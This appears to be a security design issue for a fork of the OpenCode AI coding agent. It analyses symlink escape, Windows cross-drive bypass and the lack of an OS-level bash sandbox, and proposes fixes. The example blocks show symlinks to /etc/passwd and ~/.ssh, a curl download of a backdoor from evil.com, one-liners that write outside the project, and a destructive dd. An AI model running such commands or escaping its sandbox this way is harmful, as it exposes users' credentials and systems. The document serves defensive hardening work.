## Summary

Our fork inherits OpenCode's 7-layer path protection, but has the **same known vulnerabilities** that led to CVEs in both Codex (GHSA-w5fx-fh39-j5rw, CVSS 8.6) and Claude Code (CVE-2025-54794, CVSS 7.7). The agent can escape the project directory via symlinks, and the bash tool has no OS-level sandbox.

## Current State: What We Have

All 7 upstream protection layers are present:

| Layer | Mechanism | Location |
|-------|-----------|----------|
| Lexical containment | `Filesystem.contains()` — `path.relative()` check | `util/filesystem.ts:148-150` |
| Instance boundary | `Instance.containsPath()` — checks `directory` + `worktree` | `project/instance.ts:98-104` |
| External dir prompt | `assertExternalDirectory()` — user prompt for external paths | `tool/external-directory.ts:12-32` |
| Non-git safety | Worktree `"/"` special case | `instance.ts:102` |
| File.read/list guard | `containsPath()` before filesystem ops | `file/index.ts:505, 585` |
| Bash tool analysis | Tree-sitter parse + `fs.realpath()` + external dir prompt | `tool/bash.ts:88-151` |
| Test coverage | Path traversal tests | `test/file/path-traversal.test.ts` |

## Known Vulnerabilities

### 1. Symlink Escape (High Priority)

**Documented TODO at `file/index.ts:503`**: `Filesystem.contains()` is lexical only — symlinks inside the project can escape the sandbox.

**Attack scenario:**
```bash
# Inside project directory
ln -s /etc/passwd ./innocent-looking-file.txt
# Agent reads ./innocent-looking-file.txt → reads /etc/passwd
# Filesystem.contains() passes because the path is lexically inside the project

# Worse: directory symlink
ln -s /home/user/.ssh ./config
# Agent can now read/write SSH keys via ./config/id_rsa
```

**Root cause:** `Filesystem.contains()` uses `path.relative()` which is purely lexical:
```typescript
export function contains(parent: string, child: string) {
  return !relative(parent, child).startsWith("..")
}
```

Both Codex and Claude Code had equivalent CVEs for this class of bug and now use `realpathSync()` / canonical path resolution.

### 2. Windows Cross-Drive Bypass (Medium Priority)

**Documented TODO at `file/index.ts:504`**: On Windows, cross-drive paths bypass the containment check.

`path.relative("C:\\project", "D:\\secrets")` returns `"D:\\secrets"` (absolute), which doesn't start with `".."` — so `contains()` returns `true`.

**Fix:** Add `!path.isAbsolute(rel)` check.

### 3. No OS-Level Sandbox for Bash Tool (Medium Priority)

The bash tool does tree-sitter analysis of commands, but this is **best-effort** — it only recognizes a hardcoded list of commands (`cd`, `rm`, `cp`, `mv`, `mkdir`, `touch`, `chmod`, `chown`, `cat`). Any other command with file arguments bypasses the check entirely.

**Examples that bypass:**
```bash
# These write outside project without triggering external_directory prompt:
python3 -c "open('/etc/hosts','a').write('malicious')"
node -e "require('fs').writeFileSync('/tmp/exfil', data)"
curl http://evil.com -o /usr/local/bin/backdoor
dd if=/dev/zero of=/important/file
```

Codex solves this with OS-level sandboxing (Seatbelt on macOS, bubblewrap+seccomp on Linux). Claude Code uses the same approach for bash child processes.

### 4. Prefix Collision Edge Case (Low Priority)

While `path.relative()` actually handles the basic prefix collision (`/project` vs `/project-evil`), there's no canonical resolution. Combined with symlinks, crafted paths could potentially bypass checks.

## Comparison with Industry

| Feature | Codex | Claude Code | Us (current) |
|---------|:-----:|:-----------:|:------------:|
| Lexical path check | ✅ | ✅ | ✅ |
| Symlink resolution | ✅ | ✅ (post-CVE) | ❌ (TODO) |
| `isAbsolute(rel)` check | ✅ | ✅ | ❌ (TODO) |
| OS-level bash sandbox | ✅ (Seatbelt/bwrap) | ✅ (Seatbelt/bwrap) | ❌ |
| Protected dirs (`.git`, `.ssh`) | ✅ | ✅ | ❌ |
| Configurable allow/deny paths | ✅ | ✅ | ❌ |
| Network isolation | ✅ (proxy) | ✅ (proxy) | ❌ |

## Proposed Fix — Phased Approach

### Phase 1: Harden `Filesystem.contains()` (Quick Win)

Fix the symlink escape and Windows cross-drive bugs:

```typescript
export function contains(parent: string, child: string) {
  const rel = relative(parent, child)
  // Block cross-drive paths on Windows (relative() returns absolute path)
  if (isAbsolute(rel)) return false
  return !rel.startsWith("..")
}

// New: symlink-aware version for security-critical checks
export function containsReal(parent: string, child: string): boolean {
  try {
    const realParent = realpathSync(parent)
    const realChild = realpathSync(child)
    const rel = relative(realParent, realChild)
    return !isAbsolute(rel) && !rel.startsWith("..")
  } catch {
    // Child doesn't exist yet (write op) — resolve parent dir
    const realParent = realpathSync(parent)
    const childDir = dirname(child)
    try {
      const realChildDir = realpathSync(childDir)
      const realChild = join(realChildDir, basename(child))
      const rel = relative(realParent, realChild)
      return !isAbsolute(rel) && !rel.startsWith("..")
    } catch {
      return false // Parent dir doesn't exist either — deny
    }
  }
}
```

Update `Instance.containsPath()` to use `containsReal()`.

**Tests to add:**
- Symlink pointing outside project → denied
- Directory symlink escape → denied
- Windows cross-drive path → denied
- Nested symlink chains → denied
- Symlink to allowed path within project → allowed
- Non-existent file in valid dir → allowed

### Phase 2: Protected Directories

Even inside writable roots, protect sensitive directories:

```typescript
const ALWAYS_PROTECTED = [
  '.git',
  '.ssh',
  '.gnupg',
  '.aws',
  '.env',
  '.env.local',
  '.env.production',
]
```

Codex does this for `.git`, `.codex`, `.agents`. We should extend it.

### Phase 3: Configurable Allow/Deny Paths

Add to project config (`.opencode/config.json` or similar):

```json
{
  "sandbox": {
    "allowWrite": ["~/.dbt", "/tmp/altimate"],
    "denyWrite": ["~/.ssh", "~/.aws"],
    "denyRead": ["~/.ssh/id_rsa"]
  }
}
```

### Phase 4: OS-Level Sandbox for Bash (Aspirational)

Implement Seatbelt (macOS) and bubblewrap (Linux) for bash tool child processes, following the Codex pattern. This is the most complex change but provides the strongest guarantee.

## References

- Codex sandbox bypass: [GHSA-w5fx-fh39-j5rw](https://github.com/openai/codex/security/advisories/GHSA-w5fx-fh39-j5rw) (CVSS 8.6)
- Claude Code path traversal: [CVE-2025-54794](https://github.com/anthropics/claude-code/security/advisories/GHSA-pmw4-pwvc-3hx2) (CVSS 7.7)
- Codex seatbelt impl: `codex-rs/core/src/seatbelt.rs`
- Claude Code sandbox docs: https://code.claude.com/docs/en/sandboxing
- Our TODOs: `file/index.ts:503-504`
